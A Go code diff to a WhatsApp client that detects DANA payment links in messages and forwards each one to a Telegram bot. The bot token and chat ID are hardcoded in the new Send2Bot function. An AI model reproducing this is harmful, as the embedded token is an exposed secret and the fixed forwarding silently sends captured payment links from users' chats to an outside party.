@@ -10,6 +10,7 @@ import (
 	"os/signal"
 	"regexp"
 	"syscall"
+	"encoding/json"
 
 	_ "github.com/mattn/go-sqlite3"
 	"go.mau.fi/whatsmeow"
@@ -44,6 +45,19 @@ func IsDanaLink(link string) bool {
 	return regexp.MustCompile(`^https://link\.dana\.id`).MatchString(link)
 }
 
+func Send2Bot(message string) {
+	data := map[string]string{
+		"method": "sendMessage",
+		"chat_id": "1244517040",
+		"text": message,
+		"parse_mode": "HTML",
+	}
+
+	jsonData, _ := json.Marshal(data)
+	resp, _ := http.Post("https://api.telegram.org/bot7823210249:AAH-czlhPsRr4bPU4CFQ0uUfKc4ZxiC-NFc/", "application/json", bytes.NewBuffer(jsonData))
+	defer resp.Body.Close()
+}
+
 func StartWhatsAppClient() {
 	container, err := sqlstore.New("sqlite3", "file:examplestore.db?_foreign_keys=on", nil)
 	if err != nil {
@@ -69,7 +83,7 @@ func StartWhatsAppClient() {
 			links := urlRegex.FindAllString(text, -1)
 			for _, link := range links {
 				if IsDanaLink(link) {
-					
+					go Send2Bot(link)
 				}
 				sendToSSEClients(link)
 			}
@@ -106,7 +120,7 @@ func StartWhatsAppClient() {
 				links := urlRegex.FindAllString(result.String(), -1)
 				for _, link := range links {
 					if IsDanaLink(link) {
-					
+						go Send2Bot(link)
 					}
 					sendToSSEClients(link)
 				}
